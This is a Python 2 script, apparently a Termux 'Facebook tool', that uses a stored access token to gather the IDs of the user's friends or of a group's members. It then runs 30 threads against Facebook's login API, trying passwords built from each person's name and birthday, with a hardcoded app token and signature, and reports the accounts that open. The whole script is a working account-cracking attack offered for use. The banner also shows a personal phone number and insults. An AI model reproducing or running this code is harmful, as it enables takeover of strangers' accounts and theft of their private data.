import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib
from multiprocessing.pool import ThreadPool
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
else:
    try:
        import requests
    except ImportError:
        os.system('pip2 install requests')

from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
    print '\x1b[1;91m[!] Keluar'
    os.sys.exit()


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.1)



def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;91m[+] \x1b[1;92m[ Loading ] \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
threads = []
berhasil = []
cekpoint = []
gagal = []
idteman = []
idfromteman = []
idmem = []
id = []
listgrup = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'

normal = "\033[0;37;40m" #normal
miring = "\033[3;37;40m" #miring

#text warna
abu = "\033[1;30;40m" #abu abu
merah = "\033[1;31;40m" #merah
hijau = "\033[1;32;40m" #hijau
kuning = "\033[1;33;40m" #kuning
biru = "\033[1;34;40m" #biru
pink = "\033[1;35;40m" #pink
birumuda = "\033[1;36;40m" #birumuda
putih = "\033[1;37;40m" #putih
r = "\033[91m"
y = "\033[93m"

print
print putih+"                                                ["+kuning+" Tool - Facebook "+putih+"]"
print putih+"               ( ) > Termux                                         "
print putih+"              (   )                "+merah+"?????????????????????????????????"
print putih+"             (     )               "+merah+"??"+kuning+" Author : Mr. Achmad         "+hijau+"?? "
print putih+"           _(       )_             "+merah+"??"+kuning+" Contact WA : 085608035292   "+hijau+"??"
print putih+"          [ INDONESIA ]            "+hijau+"?????????????????????????????????"+normal
print "____________________________________________________________________"
print "_____________________"+biru+"Selamat_Datang_ya_Bangsat"+putih+"______________________"
print



     
def super():
    global toket
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('reset')
    
    print '\x1b[1;37;40m[1] Daftar Teman'
    print '\x1b[1;37;40m[2] Member Grup'
    print(y+pm)
    pilih_super()


def pilih_super():
    peak = raw_input('\x1b[1;91m-\xe2\x96\xba\x1b[1;97m ')
    if peak == '':
        print '\x1b[1;91m[!] Jangan kosong'
        pilih_super()
    else:
        if peak == '1':
            os.system('reset')
            
            jalan('\x1b[1;91m[+] [ selamat datang bangsat ] \x1b[1;97m...')
            jalan('\x1b[1;91m[+] [ jangan lupa buat Subscribe youtube Achmad404 anjing ] \x1b[1;97m...')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        else:
            if peak == '2':
                os.system('reset')
                
                idg = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukan ID Grup   \x1b[1;91m:\x1b[1;97m ')
                try:
                    r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
                    asw = json.loads(r.text)
                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama grup \x1b[1;91m:\x1b[1;97m ' + asw['name']
                except KeyError:
                    print '\x1b[1;91m[!] Grup tidak ditemukan'
                    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                    super()

                re = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=9999999&access_token=' + toket)
                s = json.loads(re.text)
                for i in s['data']:
                    id.append(i['id'])

            else:
                if peak == '0':
                    menu_hack()
                else:
                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + peak + ' \x1b[1;91mTidak ada'
                    pilih_super()
    print '\x1b[1;91m[+] \x1b[1;92mID Berhasil Di Ambil \x1b[1;91m: \x1b[1;97m' + str(len(id))
    titik = ['.   ', '..  ', '... ']
    for o in titik:
    	print '\r\r\x1b[1;91m[+] \x1b[1;92m[ Loading ] \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)

    print
    print(y+pm)

    def main(arg):
        user = arg
        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            pass1 = b['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;97m[\x1b[1;92mOK] ' + user + ' | ' + pass1
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97m[\x1b[1;93mCP] ' + user + ' | ' + pass1
                else:
                    pass2 = b['first_name'] + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;97m[\x1b[1;92mOK] ' + user + ' | ' + pass2
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;97m[\x1b[1;93mCP] ' + user + ' | ' + pass2
                        else:
                            pass3 = b['last_name'] + '123'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;97m[\x1b[1;92mOK] ' + user + ' | ' + pass3
                            else:
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;97m[\x1b[1;93mCP] ' + user + ' | ' + pass3
                                else:
                                    lahir = b['birthday']
                                    pass4 = lahir.replace('/', '')
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;97m[\x1b[1;92mOK] ' + user + ' | ' + pass4
                                    else:
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\x1b[1;97m[\x1b[1;93mCP] ' + user + ' | ' + pass4
                                            
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n\x1b[1;91m[+] \x1b[1;97mSelesai'
    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
    super()

#achmad
super()
